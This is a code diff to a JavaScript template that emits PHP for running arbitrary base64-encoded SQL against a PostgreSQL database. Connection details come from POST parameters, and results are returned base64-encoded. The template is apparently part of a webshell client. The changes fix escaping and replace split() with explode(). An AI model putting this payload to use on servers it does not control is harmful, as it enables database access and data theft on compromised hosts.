@@ -1,6 +1,6 @@
 /**
  * 数据库管理模板::postgresql_pdo
- * i 数据分隔符号 => \t|\t
+ * i 数据分隔符号 => \\t|\\t
  */
 
 module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
@@ -10,7 +10,7 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
       $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
-      list($host, $port,$dbn) = split(":", $hst);
+      list($host, $port,$dbn) = explode(":", $hst);
       $port == "" ? $port = "5432" : $port;
       $dbn == "" ? $dbn = "postgres" : $dbn;
 
@@ -49,7 +49,7 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
-      list($host, $port) = split(":", $hst);
+      list($host, $port) = explode(":", $hst);
       $port == "" ? $port = "5432" : $port;
       $arr=array(
         'host'=>$host,
@@ -88,7 +88,7 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
       $tab=$m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"];
-      list($host, $port) = split(":", $hst);
+      list($host, $port) = explode(":", $hst);
       $port == "" ? $port = "5432" : $port;
       $arr=array(
         'host'=>$host,
@@ -130,7 +130,7 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
       $sql=base64_decode($_POST["${arg5}"]);
       $encode=$m?stripslashes($_POST["${arg6}"]):$_POST["${arg6}"];
-      list($host, $port) = split(":", $hst);
+      list($host, $port) = explode(":", $hst);
       $port == "" ? $port = "5432" : $port;
       $arr=array(
         'host'=>$host,
@@ -150,33 +150,33 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       }else{
         $result=$dbh->prepare($sql);
         if(!$result->execute()){
-          echo("Status\t|\t\r\n");
+          echo("Status\\t|\\t\\r\\n");
           $err="";
           foreach(@$result->errorInfo() as $v){
             $err.=$v." ";
           }
-          echo(base64_encode("ERROR://".$err)."\t|\t\r\n");
+          echo(base64_encode("ERROR://".$err)."\\t|\\t\\r\\n");
         }else{
           $bool=True;
           while($res=$result->fetch(PDO::FETCH_ASSOC)){
             if($bool){
               foreach($res as $key=>$value){
-                echo($key."\t|\t");
+                echo($key."\\t|\\t");
               }
-              echo "\r\n";
+              echo "\\r\\n";
               $bool=False;
             }
             foreach($res as $key=>$value){
-              echo(base64_encode($value!==NULL?$value:"NULL")."\t|\t");
+              echo(base64_encode($value!==NULL?$value:"NULL")."\\t|\\t");
             }
-            echo "\r\n";
+            echo "\\r\\n";
           }
           if($bool){
             if(!$result->columnCount()){
-              echo("Affect Rows\t|\t\r\n".base64_encode($result->rowCount())."\t|\t\r\n");
+              echo("Affect Rows\\t|\\t\\r\\n".base64_encode($result->rowCount())."\\t|\\t\\r\\n");
             }else{
-              echo("Status\t|\t\r\n");
-              echo(base64_encode("ERROR://Table is empty.")."\t|\t\r\n");
+              echo("Status\\t|\\t\\r\\n");
+              echo(base64_encode("ERROR://Table is empty.")."\\t|\\t\\r\\n");
             }
           }
         }
